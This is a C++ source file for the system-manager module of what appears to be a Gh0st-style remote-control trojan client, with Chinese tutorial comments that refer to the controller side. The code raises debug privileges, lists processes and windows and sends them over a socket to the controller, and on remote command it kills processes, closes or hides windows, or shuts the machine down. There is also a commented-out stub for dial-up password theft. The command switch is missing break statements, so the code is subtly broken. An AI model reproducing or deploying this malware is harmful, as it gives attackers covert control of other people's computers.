#include "SystemManager.h"
#include<TlHelp32.h>
#include<Psapi.h>

enum
{
	COMMAND_WINDOW_CLOSE,  //关闭窗口
	COMMAND_WINDOW_TEST   //操作窗口
};

CSystemManager::CSystemManager(CClientSocket *pClient, BOOL bHow):CManager(pClient)
{
	m_iHow = bHow;
	if (m_iHow == COMMAND_SYSTEM)	// 如果是获取进程
	{
		SendProcessList();
	}
	else if (m_iHow == COMMAND_WSLIST) // 如果是获取窗口
	{
		SendWindowsList();
	}
}


CSystemManager::~CSystemManager()
{
}


void CSystemManager::SendProcessList()
{
	// TODO: 在此处添加实现代码.
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();      //得到进程列表的数据，一会转到  getProcessList定义
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));   //得到发送得到的进程列表数据
	LocalFree(lpBuffer);
}


LPBYTE CSystemManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	DWORD			cbNeeded;
	char			strProcessName[MAX_PATH] = { 0 };
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);     //提取权限
	//创建系统快照
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //暂时分配一下缓冲区

	lpBuffer[0] = TOKEN_PSLIST;        //注意这个是数据头 一会我们到主控端来搜索这个数据头 
	dwOffset = 1;

	if (Process32First(hSnapshot, &pe32))       //得到第一个进程顺便判断一下系统快照是否成功
	{
		do
		{
			//打开进程并返回句柄
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID != 0) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				//枚举第一个模块句柄也就是自身
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//得到自身的完整名称
				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
				//开始计算占用的缓冲区， 我们关心他的发送的数据结构
				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
				// 缓冲区太小，再重新分配下
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				//接下来三个memcpy就是向缓冲区里存放数据 数据结构是 进程ID+进程名+0+进程完整名+0
				//为什么加0 ？因为字符数据是以0 结尾的
				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
				dwOffset += lstrlen(strProcessName) + 1;
			}
		} while (Process32Next(hSnapshot, &pe32));      //继续得到下一个快照
	}
	//用lpbuffer获得整个缓冲去 
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	DebugPrivilege(SE_DEBUG_NAME, FALSE);  //还原提权
	CloseHandle(hSnapshot);       //释放句柄 
	return lpBuffer;	    //这个数据返回后就是发送了 之前讲过了，我们可以到主控端去搜索TOKEN_PSLIST了。
}

bool CSystemManager::DebugPrivilege(const char *PName, BOOL bEnable)
{
	// TODO: 在此处添加实现代码.
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}




void CSystemManager::ShutdownWindows(DWORD dwReason)
{
	// TODO: 在此处添加实现代码.
	DebugPrivilege(SE_SHUTDOWN_NAME, TRUE);
	ExitWindowsEx(dwReason, 0);
	DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}




void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	// TODO: 在此处添加实现代码.
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);  //提权

	for (int i = 0; i < nSize; i += 4)//在这里为什么要用一个循环？  因为结束的肯呢个不止是一个进程
	{
		//打开进程
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
		//结束进程
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);    //还原提权
	// 稍稍Sleep下，防止出错
	Sleep(100);
	// 刷新进程列表
	SendProcessList();
	// 刷新窗口列表
	//SendWindowsList();	
	//分析完毕 下一节动手操作。。。。。。。。。。。。。。。。。。。
}


void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	// TODO: 在此处添加实现代码.
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_DIALUPASS:
		//SendDialupassList();
		break;
	case COMMAND_KILLPROCESS:       //这里是进程管理接收数据的函数了 在这里判断是那个命令，到KillProcess定义
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
	case COMMAND_WINDOW_CLOSE:
		CloseWindow(lpBuffer + 1);
	case COMMAND_WINDOW_TEST:
		TestWindow(lpBuffer + 1);
	default:
		break;
	}
}


LPBYTE CSystemManager::getWindowsList()
{
	// TODO: 在此处添加实现代码.
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;
}


bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;

	char	strTitle[1024];
	memset(strTitle, 0, sizeof(strTitle));
	//得到系统传递进来的窗口句柄的窗口标题
	GetWindowText(hwnd, strTitle, sizeof(strTitle));
	//这里判断 窗口是否可见 或标题为空
	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
		return true;
	//同进程管理一样我们注意他的发送到主控端的数据结构

	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //暂时分配缓冲区 

	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
	dwOffset = LocalSize(lpBuffer);
	//重新计算缓冲区大小
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//下面两个memcpy就能看到数据结构为 hwnd+窗口标题+0
	//GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);

	*(LPBYTE *)lParam = lpBuffer;

	//好了我们到主控端搜索一下发送的TOKEN_WSLIST;数据头吧
	return true;
}

void CSystemManager::SendWindowsList()
{
	// TODO: 在此处添加实现代码.
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsList();    //得到窗口列表的数据一会转到这个函数的定义
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));   //向主控端发送得到的缓冲区一会就返回了
	LocalFree(lpBuffer);
}


void CSystemManager::CloseWindow(LPBYTE buf)
{
	// TODO: 在此处添加实现代码.
	DWORD hwnd;
	memcpy(&hwnd, buf, sizeof(DWORD));      //得到窗口句柄 
	::PostMessage((HWND__ *)hwnd, WM_CLOSE, 0, 0); //向窗口发送关闭消息
}


void CSystemManager::TestWindow(LPBYTE buf)
{
	// TODO: 在此处添加实现代码.
	HWND hwnd;
	DWORD dHow;
	memcpy((void*)&hwnd, buf, sizeof(HWND));      //得到窗口句柄
	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));     //得到窗口处理参数
	ShowWindow(hwnd, dHow);
}
